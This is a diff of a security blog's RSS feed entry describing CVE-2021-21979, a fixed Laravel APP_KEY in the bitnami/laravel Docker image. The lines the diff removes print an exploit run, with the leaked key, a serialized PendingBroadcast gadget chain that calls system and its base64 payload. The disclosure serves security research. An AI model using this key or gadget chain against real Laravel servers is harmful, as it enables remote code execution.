@@ -13,7 +13,9 @@
       <pubDate>Thu, 04 Mar 2021 11:33:26 +0000</pubDate>
       
       <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/%E9%95%9C%E5%83%8F%E5%AE%89%E5%85%A8/%E6%9E%84%E5%BB%BA%E5%AE%89%E5%85%A8/CVE-2021-21979-APP_KEY-is-fixed-in-docker-image-bitnami/laravel/%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8AAPP_KEY%E5%9C%A8%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8Fbitnamilaravel%E4%B8%AD%E6%98%AF%E5%9B%BA%E5%AE%9A%E7%9A%84.html</guid>
-      <description>[漏洞报告]APP_KEY在容器镜像bitnami/laravel中是固定的 1. 漏洞简介 用户使用image bitnami/laravel时，如果文件/app/config/database.php不存在，则文件/app/.env将被文件/tmp/app/.env覆盖。
+      <description>[漏洞报告]CVE-2021-21979: APP_KEY在容器镜像bitnami/laravel中是固定的 最近，在思考容器供应链安全时，发现了一个容器镜像构建产生的漏洞(CVE-2021-21979)。问题本身比较简单，但具有较强的启发意义，可以作为一个绝佳的示例。
+这个问题在2021.02.23报告给bitnami,在2021.02.24就完成了修复。
+1. 漏洞简介 用户使用image bitnami/laravel时，如果文件/app/config/database.php不存在，则文件/app/.env将被文件/tmp/app/.env覆盖。
 if [[ ! -f /app/config/database.php ]]; then log &amp;quot;Creating laravel application&amp;quot; cp -a /tmp/app/. /app/ fi 然而，/tmp/app/.env这个文件是在docker镜像bitnami/laravel构建的时候生成的，APP_KEY的值是固定的。
 虽然每次从源码安装laravel的时候APP_KEY都会随机生成：
 // 文件 https://github.com/laravel/laravel/blob/8.x/composer.json ... &amp;quot;@php artisan key:generate --ansi&amp;quot; 但是如果我们把它构建成docker镜像，无论何时运行，APP_KEY都是一个固定的值。
@@ -25,7 +27,7 @@ if [[ ! -f /app/config/database.php ]]; then log &amp;quot;Creating laravel appl
 protected static $serialize = true; 只要我们能得到APP_KEY来加密我们的payload，我们就可以进行反序列化攻击。
 而APP_KEY可以通过迭代所有镜像来找到。
 exploit:
-╭─st0n3@yoga in ~/ctf_project/my_challenges/container/latest_laravel/exp on master ✔ (origin/master) ╰$ ./exp.sh + APP_KEY=xmdC9cSx0QWwOtm9mdG0xfdS3HWQJRtG4DhxmA3pOz4= + python -c import base64;print base64.b64encode(&amp;quot;&amp;quot;&amp;quot;O:40:&amp;quot;Illuminate\\Broadcasting\\PendingBroadcast&amp;quot;:2:{s:9:&amp;quot;\x00*\x00events&amp;quot;;O:25:&amp;quot;Illuminate\\Bus\\Dispatcher&amp;quot;:1:{s:16:&amp;quot;\x00*\x00queueResolver&amp;quot;;s:6:&amp;quot;system&amp;quot;;}s:8:&amp;quot;\x00*\x00event&amp;quot;;O:34:&amp;quot;Illuminate\\Queue\\CallQueuedClosure&amp;quot;:2:{s:10:&amp;quot;connection&amp;quot;;s:9:&amp;quot;cat /flag&amp;quot;;s:23:&amp;quot;deleteWhenMissingModels&amp;quot;;b:0;}}&amp;quot;&amp;quot;&amp;quot;) + PAYLOAD_BASE64=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozNDoiSWxsdW1pbmF0ZVxRdWV1ZVxDYWxsUXVldWVkQ2xvc3VyZSI6Mjp7czoxMDoiY29ubmVjdGlvbiI7czo5OiJjYXQgL2ZsYWciO3M6MjM6ImRlbGV0ZVdoZW5NaXNzaW5nTW9kZWxzIjtiOjA7fX0= + .</description>
+╭─st0n3@yoga in ~/ctf_project/my_challenges/container/latest_laravel/exp on master ✔ (origin/master) ╰$ ./exp.sh + APP_KEY=xmdC9cSx0QWwOtm9mdG0xfdS3HWQJRtG4DhxmA3pOz4= + python -c import base64;print base64.</description>
     </item>
     
     <item>
